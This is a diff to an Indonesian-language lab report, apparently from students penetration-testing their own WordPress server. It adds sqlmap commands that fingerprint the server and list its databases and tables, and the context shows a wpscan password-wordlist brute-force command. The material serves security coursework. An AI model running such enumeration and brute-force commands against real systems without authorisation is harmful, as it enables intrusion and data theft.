@@ -72,6 +72,7 @@ $ sudo mysql_secure_installation
 **3. Install PHP**
 
 
+
 ## D. Uji Penetrasi
 **1. Uji penetrasi dengan wpscan**
 Untuk uji penestasi pertama kita melakukan menggunakan wp scan untuk mengecek plugin apa saja yang digunakan pada ubuntuk server uji penetrasi dilakukan pada kali linux
@@ -93,5 +94,20 @@ wpscan --url localhost/wordpress --wordlist ~/passlist.txt --thread 10
 
 **2. Uji penetrasi dengan sqlmap**
 Selanjutnya kami mencoba uji penetrasi menggunakan sqlmap pada plugin leaguemanager
+```
+sqlmap --url "http://192.168.159.130/wp" --level 5 --risk 3 --dbms mysql
+```
+dari command ini kita mendapatkan OS, Webserver dan versi dbms yang diguankan
+![gambar1](Screenshot/Uji1.1.jpg)
+```
+sqlmap --url "http://192.168.159.130/wp" --level 5 --risk 3 --dbms mysql --dbs
+```
+dari command ini kita mendapat database yang terdapat pada target penetrasi
+![gambar1](Screenshot/Uji1.2.jpg)
+```
+sqlmap --url "http://192.168.159.130/wp" --level 5 --risk 3 --dbms mysql -D wordpress --tables
+```
+dari command ini kita mendapatkan tabel apa saja yang terdapat pada wordpress
+![gambar1](Screenshot/Uji1.3.jpg)
 
 ## E. Kesimpulan dan Saran
